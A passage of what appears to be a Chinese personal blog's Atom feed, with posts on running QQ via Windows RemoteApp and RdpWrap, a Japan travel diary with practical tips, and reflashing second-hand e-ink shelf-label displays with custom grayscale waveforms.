&lt;img data-src=&#39;/2023/09/20/赴日游记-二//image-20230920112400707.png&#39;  alt=&quot;image-20230920112400707&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;先去罗森搞点早饭，拿了一个饭团一个饭卷，去找服务员加热，然后把饭团加热了，告诉我饭卷是寿司，不用加热。然后在店门口吃了，日本罗森店里很多都没有座位的，也不知道该在哪吃，边走边吃好像也不太好，就站在店门口吃完走了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://ihopenot.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>使用Windows RemoteApp实现远程QQ</title>
    <link href="https://ihopenot.github.io/2023/09/13/%E4%BD%BF%E7%94%A8Windows-RemoteApp%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8BQQ/"/>
    <id>https://ihopenot.github.io/2023/09/13/%E4%BD%BF%E7%94%A8Windows-RemoteApp%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8BQQ/</id>
    <published>2023-09-13T09:05:01.000Z</published>
    <updated>2023-09-15T04:02:03.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不想把QQ运行在自己的物理机上+数据迁移和备份方便，基于这些需求，一直想把QQ跑在虚拟机里，正好实验室的pve现在也没啥负载，直接丢到pve的虚拟机里去。但是这样QQ接收消息推送又有问题，如果我一直用电脑的话可能经常不知道QQ收到消息了，而且如果用远程桌面的话会常态占用我一块屏幕。感觉挺不方便的，想着Windows有没有RemoteApp之类的轻量的远程连接，一搜还真有，然后开始折腾。</p><h1 id="RemoteAppTool"><a href="#RemoteAppTool" class="headerlink" title="RemoteAppTool"></a>RemoteAppTool</h1><p>windows的remoteApp也是用的mstsc连接，但是rdp配置不太一样。</p><p>有个工具<a href="https://github.com/kimmknight/remoteapptool">RemoteAppTool</a>可以方便的生成rdp文件。</p><span id="more"></span><img data-src="/2023/09/13/%E4%BD%BF%E7%94%A8Windows-RemoteApp%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8BQQ/image-20230915112413731.png" class="" title="image-20230915112413731"><p>点下面的绿色加号选中你要启动的远程应用exe文件，之后create client connection。server address和port填你机器的ip和rdp的端口，之后create就会生成一个rdp文件，把这个rdp文件复制出来就可以远程使用了。</p><p>第一次尝试的时候用的QQ正式版，登录没啥问题，也能正常使用，就是QQ那个悬挂，因为QQ的图形界面用了很多奇技淫巧，不是那么正式，所以rdp支持有些问题，经常会有残影，黑边什么的，用起来很难受。</p><p>所以之后挺长一段时间都是将就着用远程桌面，因为remoteApp实在是受不了。但是前段时间看到了QQNG，次世代QQ，是基于electron写的，感觉这玩意应该rdp支持挺不错的，于是又搞了一遍，发现这次确实可用了。QQNG的图形界面rdp基本完美兼容，至少我用到现在没发现有什么大问题，唯一一点不太好就是鼠标挪到任务栏小图标那里没有浮动窗口，但是基本已经可以用了，不用在挂个远程桌面在旁边了。</p><p>效果大概长这样。</p><img data-src="/2023/09/13/%E4%BD%BF%E7%94%A8Windows-RemoteApp%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8BQQ/image-20230915113636343.png" class="" title="image-20230915113636343"><h1 id="Rdp多用户"><a href="#Rdp多用户" class="headerlink" title="Rdp多用户"></a>Rdp多用户</h1><p>虽然RemoteApp效果不错，但是由于windows个人版的限制，rdp只能一个连接同时存在，要是有第二个连接建立的话就只能把第一个挤掉。</p><p>rdp目前好像方案不多，要么使用windows Server，这个是原生就支持多个连接的，是最官方的做法。但是要跑在虚拟机里本来为了精简就是用的windows ltsc，再上server感觉有点重量级了。试了下server感觉启动都变慢了。。</p><p>还有一种方案是给它日开，有个项目做了这个事情，叫<a href="https://github.com/stascorp/rdpwrap">RdpWrap</a>，虽然挺久没更新了，但是有人维护了一个patch列表，支持很多版本，在<a href="https://github.com/sebaxakerhtc/rdpwrap.ini">这里</a>，找到对应系统的版本的ini文件丢到C:\Program Files\RDP Wrapper\rdpwrap.ini里就行了。</p><p>fully supported就是ok了。</p><img data-src="/2023/09/13/%E4%BD%BF%E7%94%A8Windows-RemoteApp%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8BQQ/image-20230915115554917.png" class="" title="image-20230915115554917"><p>开了single session per user，开了两个用户，一个挂qq一个连远程桌面，如果不开这个的话远程桌面退了再连会新开一个session而不会重新连上之前那个session，只能手动在任务管理器里切，体验有点差，所以开了两个用户。</p><p>两个用户也有不好，rdp记住密码只会记住一个凭证，所以我现在是一个用户直连ip，一个用户连域名，这样windows可以记住两个账号。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不想把QQ运行在自己的物理机上+数据迁移和备份方便，基于这些需求，一直想把QQ跑在虚拟机里，正好实验室的pve现在也没啥负载，直接丢到pve的虚拟机里去。但是这样QQ接收消息推送又有问题，如果我一直用电脑的话可能经常不知道QQ收到消息了，而且如果用远程桌面的话会常态占用我一块屏幕。感觉挺不方便的，想着Windows有没有RemoteApp之类的轻量的远程连接，一搜还真有，然后开始折腾。&lt;/p&gt;
&lt;h1 id=&quot;RemoteAppTool&quot;&gt;&lt;a href=&quot;#RemoteAppTool&quot; class=&quot;headerlink&quot; title=&quot;RemoteAppTool&quot;&gt;&lt;/a&gt;RemoteAppTool&lt;/h1&gt;&lt;p&gt;windows的remoteApp也是用的mstsc连接，但是rdp配置不太一样。&lt;/p&gt;
&lt;p&gt;有个工具&lt;a href=&quot;https://github.com/kimmknight/remoteapptool&quot;&gt;RemoteAppTool&lt;/a&gt;可以方便的生成rdp文件。&lt;/p&gt;</summary>
    
    
    
    
    <category term="折腾" scheme="https://ihopenot.github.io/tags/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>赴日游记</title>
    <link href="https://ihopenot.github.io/2023/09/10/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0/"/>
    <id>https://ihopenot.github.io/2023/09/10/%E8%B5%B4%E6%97%A5%E6%B8%B8%E8%AE%B0/</id>
    <published>2023-09-10T14:25:59.000Z</published>
    <updated>2023-09-15T03:10:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>挺早就想去日本了，被二次元吸引，但是苦于没有时间+缺人，一直没去。正好今年暑假前和群友聊天，发现有小团体，准备去日本summer pockets朝圣旅游，直接加入群聊。之后虽然实际上去的时间都是分散的，见面时间也不长，但是有个靠谱室友，所以总的这次赴日还是很成功的。</p><p>原本这种东西应该赴日途中一边旅游一边写的，但是实际上每天急行军，基本白天全在走路，到晚上躺床上就想摸了。所以只有现在摸出来一些空闲时间写下游记。而且还有一堆视频影像资料没剪……</p><p>这里稍微记录一下这次日本的旅行，还有一些去之前没了解到的东西，如果可能帮后人少走点弯路。</p><span id="more"></span><h1 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h1><h2 id="Mon-2"><a href="#Mon-2" class="headerlink" title="Mon -2"></a>Mon -2</h2><h3 id="行程规划"><a href="#行程规划" class="headerlink" title="行程规划"></a>行程规划</h3><p>基本确定要去日本了，新建共享文档，开始设计旅游计划，决定要去哪里。开了个google map共享列表就开始找地点了。</p><p>首先上榜的几个地点：</p><blockquote><p>鸟白岛（直岛，男木岛，女木岛）：Summer Pockets朝圣点，赴日旅游的本初原因。</p><p>富士山：不会有人去日本不看富士山吧（哦原来是我，火车途径两次，加到富士县一次，每次富士山都被云层层包裹，一次都没看到。。</p><p>秋叶原：不会有二次元去日本不去秋叶原吧。</p><p>小豆岛：《擅长捉弄的高木同学》朝圣点。</p><p>三轩茶屋：《P5R》主角家在的四轩茶屋朝圣点。</p><p>金阁寺：以前玩东方时候有一张符卡叫金阁寺的天花板，所以想去看看天花板。。</p><p>北野异人馆：室友加的，《Fate Stay Night》远坂凛的家。</p><p>诹访大社：东方众朝圣。</p><p>姬路城：欧陆风云4里修奇观的时候见到过。</p></blockquote><p>预期行程14天，想要都去一遍，最后行程决定从东京落地，到京都沿路南下到大阪，濑户内海，之后返回东京再起飞回国，算是比较科学的。</p><p>这里行程设计的时候主要考虑到前一个酒店退宿之后要赶到下一个酒店先放行李，所以日程安排大都是早上从A出发到B，这样到B之后可以立刻放下行李，尽量缩短携带行李的时间。但是实际上日本旅游业非常发达，基本你能到的任何有车站码头的地方都有临时存放行李的地方，根据行李大小也就几百日元，而且到酒店无论是还没到check in的时间或者是check out之后都可以把行李寄放在工作人员那里，非常方便，甚至有的酒店询问你check in的时间，在你check in之前直接把行李送到你房间。这样实际旅游基本不用在意行李，规划的时候就灵活多了。</p><h3 id="办理护照"><a href="#办理护照" class="headerlink" title="办理护照"></a>办理护照</h3><p>然后办理护照，移民局小程序上看得到附近有哪些办理点，基本找个近的去就行了，预约好像也没啥用，可能是附近人不多？去就走个流程，就带个身份证和钱就行了，他那边一般有机器给你拍照，之后就跟着工作人员指引办理，最后交钱，一般会让他把护照邮寄过来比较方便。办理时间我是花了半个月多点拿到的护照，这个东西可以早点办理，反正迟早用得上。</p><h2 id="Mon-1"><a href="#Mon-1" class="headerlink" title="Mon -1"></a>Mon -1</h2><h3 id="办理签证"><a href="#办理签证" class="headerlink" title="办理签证"></a>办理签证</h3><p>办了护照之后办签证，其实应该早点办的，提前一个月办比较合理，我和室友都是7月2号把材料寄出去的，12号出签，但是室友的签证就基本是卡着机票的极限20号出的签，可能是我是重庆领区办理的签证，人比北京领区人少所以办的快些。总之签证还是早点办比较好，卡到最后几天搞得人心惶惶也确实不好受。</p><p>办签证的话日本现在是没有个人送签的，所以基本是淘宝找旅行社办理，学生的话单次旅游签基本没什么门槛，但是三年多次的话就要收入证明了。</p><h3 id="JR-Pass"><a href="#JR-Pass" class="headerlink" title="JR Pass"></a>JR Pass</h3><p>JR Pass是日本铁路通票，有了这个，在日本除了新干线上のぞみ（希望号）和みずほ（瑞穗号）两种类型的列车无法乘坐，其他JR运营的线路可以随意免费坐。日本铁路系统比较复杂，除了JR以外还有很多私营的铁路公司，这些公司运营的线路没法使用JR Pass乘坐，但是JR运营的铁路遍布日本，只使用JR也能够到达日本大部分地区了。</p><p>去的时候买的JR Pass是14天一共2500左右人民币，如果更短途的旅程还有7天的JR Pass，会更便宜一些。由于旅途原因选择了14天的版本，因为开销最大的两次行程分别从东京到京都和高松到东京，实在是没法压到7天之内，不然肯定选7天的版本更划算，这两趟就要3万多日元了，JR Pass也就不到5万日元。不过回国前几天好像看到有说JR Pass可能要涨价。</p><p>总之去日本要是新干线坐的多的话买JR Pass肯定不亏。</p><h3 id="移动WiFi"><a href="#移动WiFi" class="headerlink" title="移动WiFi"></a>移动WiFi</h3><p>去日本那边没有流量，漫游流量很贵，所以是搞了个漫游超人，就是便宜的日本本地卡开的流量，然后开了个热点，就当wifi用了。十多块钱一天吧，基本在日本使用每天能用好几G的流量也没有限速啥的，充一次电也能带着跑一天，还是挺方便的。</p><h3 id="运动相机"><a href="#运动相机" class="headerlink" title="运动相机"></a>运动相机</h3><p>出国机会不多，想着出去拍点东西回来，留个纪念。本来打算搞个执法记录仪整天拍的，然后研究着研究着就消费升级了，最后搞了个大疆的action3，虽然估摸着action4快出了，但是总得搞个能拍的，所以还是下单了。因为不想用手机拍，一个是耗电，拍个一两个小时可能就顶不住了，而且发热。二个是存储空间，最后省着拍都拍了300多个G的内容，手机还是有点难顶的。</p><p>但是到手的action3续航有问题，4k60拍十几分钟就过热了，1080p都不能录到电耗干，加上日本那边夏天太阳也大，户外边走边录两下就过热了，sb大疆。走之前就发现有这个问题，但是因为马上就要出发，返修来不及了，只能将就用。回来就送修，说是什么模块烂了，给换了个新的，好一点，但是离客服发的实验室续航参数还是有差距，懒得折腾了就这样吧。</p><p>然后拍的时候，能拍4k还是尽量4k，帧率低点其实没啥，4k确实比1080清晰多了。因为4k录不久，当时想的1080p120帧将就下，但实际上1080p录120帧很糊，不如帧率调低点会看着更清晰。还有就是action3是电子防抖，夜间过黑的话录制会烂掉，当时走之前最后几天拍了下河边夜景，出来完全不能看，整个画面全在乱抖。</p><p>为了方便录制，走之前搞了个脖挂，能把action3放在胸口拍，挺不错的。</p><h3 id="支付"><a href="#支付" class="headerlink" title="支付"></a>支付</h3><p>虽然之前有所耳闻，但是想着这都2023年了，电子支付应该在日本已经多起来了吧？这样想着，没准备取太多钱，先搞了4万日元，但是实际上日本电子支付有，但还是不普遍，而且支援国内电子支付的地方也不多，基本只有大型连锁店和一些景点支持。所以实际上在日本支付还是以现金为主，在日本信用卡支付也比电子支付普遍得多，所以去之前搞张visa或者master card的信用卡真的很有用。而且由于日本电子支付很少支持国内的微信支付宝等，所以一定要用电子支付的地方，比如麦当劳小程序下单啥的，要么信用卡，要么就是使用日本本土的电子支付，但是像Line这种日本那边的微信一样的程序，没有日本手机号是注册不了的，所以旅客的话基本很难用日本本土的电子支付，基本只能绑定信用卡进行消费，要是没有信用卡这些服务就用不了了。</p><p>提起取现金还有一点，因为外钞比较特殊，各个银行营业厅不会随时备有大量外钞，所以要取钞的话需要提前预约，预约之后对应的营业厅会调外钞过来，你才能取。这里批判一下中行，app上预约等于没有预约，到了线下还是取不出钱，还得线下再约。对比室友在建行去外钞，预约完了直接工作人员打电话确认取钞时间和金额，靠谱多了。</p><h3 id="机票酒店"><a href="#机票酒店" class="headerlink" title="机票酒店"></a>机票酒店</h3><p>机票酒店真贵啊，旅游大头就这俩了，研究了半天，最后图省事买了直飞东京的航班，回程是过上海中转一下，最后00:20落地的航班，时间相比已经挺阳间了。最后机票是4000+，图省钱的话其实还有更好的选择，比如桃子或者春秋航空的廉航，或者一些需要转机的阴间航班，这些阴间航班大部分可能需要在机场过夜。。最省钱应该能在3000块附近打住，虽然不知道怎么搞的，但是有个群友2000+搞定了往返机票，可能是有航司的优惠计划啥的吧。</p><p>酒店没啥好说的，我们这次主要是在携程上订的酒店，还有airbnb，booking啥的都可以用。特别是这次旅游住的岛上民宿，携程上基本是没有的，得上后面几个平台，国外的信息会多一些。酒店的话要是能确定行程的话就尽早定吧，特别是旅游旺季的时候，像这次最后几天在东京的住宿基本就是没得选，要么贵，要么偏，最后是在浅草附近找的相对便宜的酒店，早定的话选择可能会多很多。</p><h2 id="Day0"><a href="#Day0" class="headerlink" title="Day0"></a>Day0</h2><p>早上的飞机，中午12点才能落地，为了求稳一点预约了个滴滴，免得早起打不到车的尴尬。</p><p>飞机餐感觉还不错，然后入境的话飞机上会发一个小卡片，好像是要填好然后在海关那里用。我们是从成田机场入境，下飞机到海关前面人巨多，还基本都是外国人，有点工作人员指引，但是叭叭的全是日文，也听不懂，看了下，好像是要扫大屏幕上的二维码，然后填入境信息。这个好像就是飞机上的小卡片的对应的电子版吧，要是下飞机有网络环境的话填这个，没网就填小卡片，大概是这个意思吧。然后我们有网，所以填了电子资料，然后有个二维码，过海关的时候给他扫就行了。</p><p>然后护照过的话，因为我是电子签证，把电子签证上的二维码扫开给他看就行了，最后录个指纹就可以过关了。</p><p>之后是一些海关的申报检查啥的，没啥违禁品就不太用管。日本海关入境不让带肉类和肉制品，火腿这种也不行，入境之前最好看下啥能带啥不能带。</p><p>然后过了海关就去办JR Pass，应该各个机场都有办理的地方，成田机场在往下一个大厅进门左手边，之前网上听说去办JR Pass人很多，可能要排很久队，但是我们到的时候前面只有两个老外在那排，很快就到我们了。工作人员都能使用英文，进门先一个老头先大致询问了我们JR Pass的时间安排，从哪天开始到哪天结束，之后问我们出了机场目的地是哪，写在一张纸上一起给后面的工作人员。感觉老头的英文水平明显比后面的工作人员水平高，应该是提前问清楚减少后面工作人员压力。之后的工作人员给我们办理好了JR Pass，然后教我们怎么用，什么规则之类的，这个还有份说明，各个语言版本都有，我们要了份中文的来看。</p><img data-src='/2023/09/10/赴日游记//IMG20230725133429.jpg'  alt="IMG20230725133429" style="zoom: 10%" /><p>办好之后工作人员会直接跟你确认时间然后帮你把到目的地的车票买好，非常便利。</p><p>之后就是坐火车一路前往京都，路上大多是郊区风景，看到标牌都是日文才有来了日本的感觉。而且日本这些郊区的房子大多是平房，而且一大片的全是居民区的样子，也不知道他们平时购物啥的配套设置都是在哪。</p><p>成田特快内部，不知道为啥基本没啥人，之后赶回国飞机的那班火车上人就巨多。然后日本列车的乘务员在从一节车厢进另一节车厢的时候会向车内鞠躬一下，之后离开的时候也会再鞠躬一下。</p><img data-src='/2023/09/10/赴日游记//IMG20230725140248.jpg'  alt="IMG20230725140248" style="zoom: 10%;" /><p>然后是沿途的风景，像这种太阳能板日本郊区，或者至少是成田特快沿途真的是一片一片的，非常多。</p><img data-src='/2023/09/10/赴日游记//IMG20230725163528.jpg'  alt="IMG20230725163528" style="zoom:10%;" /><p>这张是火车经过富士的时候拍的，后面的山预计是富士山，但是云太多了，完全看不见。。</p><img data-src='/2023/09/10/赴日游记//IMG20230725155327.jpg'  alt="IMG20230725155327" style="zoom:10%;" /><p>然后到了京都站，京都站巨大无比，不止是火车站，而且上层还有商圈，购物中心，小公园等等各种设施，很繁华，而且也很容易迷路。但是刚到第一天，没有心情玩啥，准备是先到酒店放个东西，休息一会去吃晚饭。正好大学同学Y同学现在就在京都这边，对面提议来京都站接我们，于是就在京都站等了一会。然后等的时候看到日本的出租车啥的，跟国内长相差别还蛮大的，而且头上都会顶一个圆球，有的还是那种粉光的爱心，很迷惑。</p><img data-src='/2023/09/10/赴日游记//IMG20230725175604.jpg'  alt="IMG20230725175604" style="zoom:10%;" /><p>Y同学到了之后，先到酒店放东西。酒店是特意选了离京都站近的一家酒店，而且价格也很便宜，相比之后的住宿来说。之后休息了一下准备去觅食，反正跟着走就是了，也不知道去的哪个地方，是坐地铁去的。</p><p>日本这边感觉火车和地铁没啥区别，日本铁路对日本人的地位大概和中国的地铁差不多，非常方便，刷交通卡都能直接上，也没有安检这种东西。然后日本交通系IC卡也是比较常用的东西，刷地铁，刷火车，刷公交都可以用，而且很多店和自动贩售机也是支持交通系IC卡直接扣款的，比如松屋这些。而且街机机台有的也可以刷交通系IC卡，不过好像要先到官网绑定一下。交通系IC卡也有很多种，但是最常见的还是ICOCA和SUICA两种，分别是西日本和东日本发行的，现在交通全互通之后一般都是两种卡都可以用的，我是从同学哪里继承了一张ICOCA，但是ICOCA对google钱包支持不太行感觉，感觉可能SUICA要稍微好用些，如果使用的apple系的手机的话apple pay是可以直接给SUICA充钱的，也能直接用iPhone的NFC去刷卡。不过没法在线充值也问题不大，在日本随处可见的便利店里都可以直接用现金给交通系IC卡充值。</p><p>之后到了吃饭的商圈，其实应该叫商业街。日本很多地方都有类似这种街道，一整条街全是卖东西的或者卖吃的，各种店铺。</p><img data-src='/2023/09/10/赴日游记//IMG20230725184210.jpg'  alt="IMG20230725184210" style="zoom:10%;" /><p>商业街旁边的一个小天满宫，没进去看了。</p><img data-src='/2023/09/10/赴日游记//IMG20230725184417.jpg'  alt="IMG20230725184417" style="zoom:10%;" /><p>之后Y同学带着准备去吃寿司郎，一个回转寿司店，领了个号，但是前面人巨多，等候室椅子都坐满了，然后准备回街上转转再过来吃。之后被带到了二次元周边店，里面各种挂画，手办啥的，还有日本的原神同人。。</p><img data-src='/2023/09/10/赴日游记//IMG20230725190941.jpg'  alt="IMG20230725190941" style="zoom:10%" /><p>之后回去看了一眼号，人还是多，还得等挺久的，就又回街上接着转，最后转不动了，再店面等了一会，最后8点过才吃上。。他这个回转寿司叫做回转，但是现在都是拿个平板自己点，点了之后直接转到你面前，也没有那种一直再转随时可以拿的即兴寿司。虽然据Y同学说是之前是有的。然后这些平板点菜的店，平板很多都是支持多国语言的，也不用担心不知道点的啥，虽然还是有些菜没有翻译就是了。我们点了很多寿司，令我印象最深的是360円一份的金枪鱼大脂，真的妙，入口即化，肥美的口感，带点芥末真是绝妙。还有是酸梅酱鱿鱼刺身，上面点了一片奇怪的香菜，一口吃下去全是奇怪的味道，而且酸梅酱还贼酸，吃了一块不想吃第二块了。。大脂就是图里白色盘子的那块。</p><img data-src='/2023/09/10/赴日游记//IMG20230725203351.jpg'  alt="IMG20230725203351" style="zoom:10%;" /><p>还有一个茶蒸蛋，里面还有些鲍鱼，虾仁之类的海鲜一起蒸，味道还是不错的。虽然当时点的时候可能看错了以为是茶泡饭，结果上来发现不对劲是个蒸蛋，但是还是挺好吃的。</p><img data-src='/2023/09/10/赴日游记//IMG20230725205030.jpg'  alt="IMG20230725205030" style="zoom:10%;" /><p>之后吃完，一共好像吃了7000日元。。Y同学请客了。。然后出去大概已经晚上9点过了，这个时候很多商铺都已经关门了，回去的路上也清净了很多。当时的感受是，9点就关门了，日本人没有夜生活吗。然后经过一个土耳其烤肉店的时候，店门口有个外国老哥突然对我们蹦了一句中文，”我爱中国“。。有点迷惑，不知道咋回应，想说我也爱，额，爱啥？土耳其吗，还是日本？然后Y同学回复，good，奖励你1000社会信用点。</p><p>虽然大部分店铺都关门了，但是街机厅还没关，回去的路上进机厅又玩了一会，拍摄打beat mania。看了一下好像没有sega系的街机，就没咋玩。</p><img data-src='/2023/09/10/赴日游记//IMG20230725213457.jpg'  alt="IMG20230725213457" style="zoom:10%;" /><p>之后回到酒店，睡觉。</p><p>最后还有个小插曲，因为刚下飞机太累了，离开酒店的时候身上啥也没带，地铁是用的同学的卡坐的。当时坐的时候以为里面的钱还够来回，结果只够去，回来的时候同学刷出去了我被关在里面了。。我俩身上都没带现金，地铁站充IC卡又只能用现金，场面一度十分尴尬。幸好室友带了卡，然后在工作人员指导下到711便利店里的ATM机里取钱。取的时候才发现没开跨境取款，又在手机上把跨境取款打开了，这才取出来钱。。虽然捐了50多块的手续费。</p><p>日本不是国内，出门一定要带钱啊。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;挺早就想去日本了，被二次元吸引，但是苦于没有时间+缺人，一直没去。正好今年暑假前和群友聊天，发现有小团体，准备去日本summer pockets朝圣旅游，直接加入群聊。之后虽然实际上去的时间都是分散的，见面时间也不长，但是有个靠谱室友，所以总的这次赴日还是很成功的。&lt;/p&gt;
&lt;p&gt;原本这种东西应该赴日途中一边旅游一边写的，但是实际上每天急行军，基本白天全在走路，到晚上躺床上就想摸了。所以只有现在摸出来一些空闲时间写下游记。而且还有一堆视频影像资料没剪……&lt;/p&gt;
&lt;p&gt;这里稍微记录一下这次日本的旅行，还有一些去之前没了解到的东西，如果可能帮后人少走点弯路。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常" scheme="https://ihopenot.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>墨水屏折腾</title>
    <link href="https://ihopenot.github.io/2023/05/30/%E5%A2%A8%E6%B0%B4%E5%B1%8F%E6%8A%98%E8%85%BE/"/>
    <id>https://ihopenot.github.io/2023/05/30/%E5%A2%A8%E6%B0%B4%E5%B1%8F%E6%8A%98%E8%85%BE/</id>
    <published>2023-05-30T08:24:01.000Z</published>
    <updated>2023-08-24T14:12:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年就买了几个墨水屏，本来打算玩的，但是一直抽不出时间（懒）。最近稍微闲下来点，来研究下墨水屏。</p><p>一开始捡的闲鱼2.13寸的黑白屏，7块钱一个。但是这个不支持蓝牙，玩了一下又入了一批支持蓝牙的版本，无线刷图还是要舒服一些的。</p><h1 id="第一批墨水屏"><a href="#第一批墨水屏" class="headerlink" title="第一批墨水屏"></a>第一批墨水屏</h1><p>这批墨水屏是Stellar-M型号的，一开始看了很多资料，感觉可搞才入的，但是后来到手才发现屏和主流的Stellar-M不太一样。</p><p>拆解和烧录程序参考<a href="https://www.bilibili.com/read/cv21954945/">这篇文章</a>，这篇文章写的挺好，整个的操作基本是按照这篇文章走的。</p><p>汉朔的电池都是类似的拆法，拿螺丝刀抵住后面的卡扣往上翘就行，很容易拆下来。前面板是胶封的，得拿小刀从旁边小心的撬。</p><p>拆下来看，板子的主控是MSP430G2553，屏是WF0213T5PBZ08230H。</p><p>这个屏型号具体信息网上也搜不到，<a href="https://github.com/CursedHardware/epd-datasheet">这个仓库</a>里有类似型号的信息，但也不多，应该是<a href="http://www.wf-tech.com/">WF-Tech无锡威峰</a>的屏。</p><p>板子拆出来之后用串口怼上去，我用的CH340G，接线方法参考上面那篇文章。理想情况是可以只拆电池然后接调试口刷的，但是用串口刷的话要从pcb前面飞线，所以一定得把板子拆下来。</p><span id="more"></span><p>软件是使用IAR for msp430，之后的编译过程和烧录过程都和上面的文章一样。</p><p>然后喜闻乐见刷上去没反应。</p><p>网上搜了半天发现了<a href="https://colz.com.cn/index.php/archives/34/">这篇文章</a>，发现是因为屏的原因，这个屏的主控是UC8151C，跟Eink的那款屏主控不一样，交互协议也不一样，而且屏的具体参数也有区别，UC8151C的这款屏分辨率是104*212的，相比之下分辨率要小了一圈，但是主控是支持4阶灰度显示的，这点比较好。</p><p>这个屏相关的一些讨论还有<a href="https://www.mydigit.cn/forum.php?mod=viewthread&tid=242990">这个Thread</a>。</p><p>从colz那篇文章里抓出来的代码刷上去已经可以正确驱动墨水屏了，但是没有灰度显示。难得有个支持灰度的屏不能用也太憋屈了。但是论坛老哥虽然说支持4灰阶但是也没给代码。</p><p>然后自己网上搜搜主控相关资料，发现大连佳显有一款屏也是同型号的主控，而且例程有四灰阶的显示，直接把例程移植过去，成了。</p><img src="result1.jpg" alt="result1" style="zoom: 15%;" /><p>这个板子上还有个2.4G无线芯片A7106，理论上可以从一个屏控制其他屏，但是代码不会写，没研究了（</p><h1 id="第二批墨水屏"><a href="#第二批墨水屏" class="headerlink" title="第二批墨水屏"></a>第二批墨水屏</h1><p>这批墨水屏型号是Stellar-M3N@E31A和Stellar-XL3N@E31A。相比之前的墨水屏这个支持黑白红三色显示，而且主控有蓝牙功能，据说带N是支持NFC的意思，但是不太会玩。</p><p>2.13寸屏拆解的过程和之前的一样，4.2寸的屏因为前面板是卡扣扣上的，所以是可以无损拆卸的。</p><p>4.2寸的pcb整个和2.13不能说完全一致，只能说十分相似，肉眼看了下就4.2寸多了个flash，连layout也几乎一致。实际上2.13的代码改了改分辨率就能直接丢到4.2上跑，所以下面主要以2.13寸的屏来说下。</p><p>拆下来主控是TI的CC2640，屏是DEPG0213RHS75AF1CP，东方科脉的屏。这个屏在前面那个datasheet里也能找到同型号的屏，但是在后面实际开发过程中感觉这个数据是有点问题的。</p><p>先研究下怎么刷固件，正好手头有一个jlink，pcb背板引出来的调试接口感觉正好是给cjtag用的，准备用cjtag刷一下，但是接上之后没反应。网上搜了下发现是说cc2640有cjtag但是只有xds的调试器是支持的，jlink用不了。</p><p>无奈找同学接了一个xds110来刷，这下认了。</p><p>接线就是背板的VCC，GND，TMS，TCK，NRST和xds110对应的引脚接起来就行了，垃圾焊工导致下面这个板子TMS焊盘被我搞掉了（后来整了个调试夹子</p><img src="bak2.13.jpg" alt="2.13bak" style="zoom:15%;" /><p>刷写固件用的是uniflash，一开始不知道为啥xds读取写入感觉怪怪的，老是写不进去，而且读取有时候能读，有时候读出来有是空的，感觉供电有点问题，把xds板子上面一个XDS110Power的脚短接之后就正常了。。。也不知道这个脚具体是干啥的。供电不稳的情况下强行写入还把一个板子干烂了，好像是把CCFG写了把调试接口锁了。。血亏5块。</p><p>之后找能用的固件，一开始入这个板子原本是看到<a href="https://github.com/atc1441/ATC_TLSR_Paper">这个项目</a>，专门找的Stellar-M3N买的，结果到手了发现还是不一样（。那个项目的主控是TLSR8359，这个板子是cc2640，直接烂掉。</p><p>之后找找有没有别的可以用的，然后发现了<a href="https://www.cnblogs.com/myfish3/p/14404414.html">这篇文章</a>，都是CC2640的主控，整个源码编译烧录流程可以直接按照他这个走。<a href="https://github.com/muyuchl/cc2640BleEpd">他的仓库</a>里的代码也可以直接使用，就直接拿他的代码来用了。</p><p>蓝牙控制试了下他仓库里的app，发现实在有点难用，然后找了<a href="https://github.com/reece15/stellar-L3N-etag">这个仓库</a>的web端来操控，稍微改了下两边的源码把它们胶起来，就可以舒服的使用了。</p><p>然后有了之前折腾灰度的经验，想着能不能把这个屏也搞上灰度，研究了一下发现了<a href="https://github.com/ieiao/epd-gray-demo">这个仓库</a>，原理是用到了一个叫LUT的东西，即 Waveform Look Up Table(LUT)，详细说明可以看<a href="https://andelf.github.io/blog/2021/01/14/play-with-2-13-inch-e-ink-display/">这篇博客</a>的结尾。</p><p>然后对照了看了下源码和芯片手册，本来照着epd-datasheet查出来屏的主控是SSD1675B，但是手册上LUT感觉对不上，源码中LUT长度只有70，之后东翻翻西找找好像找到了这个屏的官方文档<a href="https://github.com/eleree/depg0213rh">https://github.com/eleree/depg0213rh</a>，这个屏的主控疑似是SSD1619A，之后照着手册搓了个LUT出来，</p><p><img src="/2023/05/30/%E5%A2%A8%E6%B0%B4%E5%B1%8F%E6%8A%98%E8%85%BE/lut.png" alt="lut"></p><p>大意就是刷黑的话就每次以正电压持续3个周期，之后静置5个周期，纯yy出来的，感觉效果还行。要刷4阶灰度就先用这个波形刷一遍最浅的灰，之后在用这个波形刷一遍，如果刷的区域和最浅的灰重叠，重叠部分就会变成较黑的灰，同理再刷更深色的灰，这个波形刷3次基本就是黑色的，所以只有4阶灰。更高的灰阶也可以实现，只要改下持续周期和电压强度。</p><p>之后改了下web，上屏，使用。</p><img src="bgr.jpg" alt="bgr" style="zoom:15%;" /><img src="gray.jpg" alt="gray" style="zoom:15%;" 